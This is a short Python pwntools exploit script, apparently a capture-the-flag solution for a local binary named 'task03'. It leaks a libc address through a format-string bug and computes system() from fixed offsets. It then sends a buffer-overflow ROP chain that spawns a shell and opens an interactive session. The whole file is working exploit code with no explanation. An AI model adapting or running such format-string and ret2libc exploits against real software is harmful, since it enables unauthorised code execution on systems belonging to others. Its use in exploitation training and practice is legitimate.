from pwn import *


io = process("./task03")
io.recvuntil("What is your name?")
password = b'%27$p' + p64(0) + b'A' * 123 + p64(0x40124F)
io.sendline(password)

while True:
	try:
        # use "readline" from pwntools
		line = str(io.recvline())
		print(line)
		if "Hello there," in line:
			address = (line.split())[-1]
			address = address[0:len(address)-3]
			puts_address = hex(int(address, 16))
			system_address = int(str(puts_address), 16) - int('0x6F690', 16) + int('0x45390', 16)
		if "What is your name?" in line: 
			password = b'A' * 136 + p64(0x4012EB) + p64(0x40302A) + p64(system_address)
			io.sendline(password)
	except:
		#could not read line => program exited
		break
#io.kill()

io.interactive()